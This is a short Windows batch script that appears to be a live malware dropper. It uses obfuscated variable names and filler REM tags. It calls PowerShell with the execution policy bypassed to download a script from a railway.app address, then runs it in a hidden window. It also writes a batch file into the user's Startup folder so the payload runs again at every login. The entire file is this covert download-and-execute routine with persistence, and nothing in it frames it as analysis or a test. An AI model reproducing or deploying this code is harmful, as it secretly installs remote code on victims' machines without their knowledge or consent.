@echo off
REM Ver346
setlocal EnableDelayedExpansion
REM Ver108
REM Mod671

REM [21737d3c7037246b330c485de4ce8eb7]

set "9032ad9d=%LOCALAPPDATA%\52026dfe9a"
set "95ebd5cc=https://web-production-9d7cc.up.railway.app/client.ps1"
set "43b09104=%9032ad9d%\be8dd4df25.ps1"

REM Proc558
if not exist "%9032ad9d%" mkdir "%9032ad9d%"

REM Sys676
powershell -ep bypass -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadFile('%95ebd5cc%','%43b09104%');Start-Process powershell -ArgumentList '-w hidden -ep bypass -f \"%43b09104%\"' -WindowStyle Hidden"

REM Core259
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
if not exist "%startup%\ad1a68.bat" (
    echo @echo off> "%startup%\ad1a68.bat"
    echo powershell -w hidden -ep bypass -f "%43b09104%">> "%startup%\ad1a68.bat"
)

REM Core531
exit /b 0

REM [4341E136ACCD81D953B332EB]
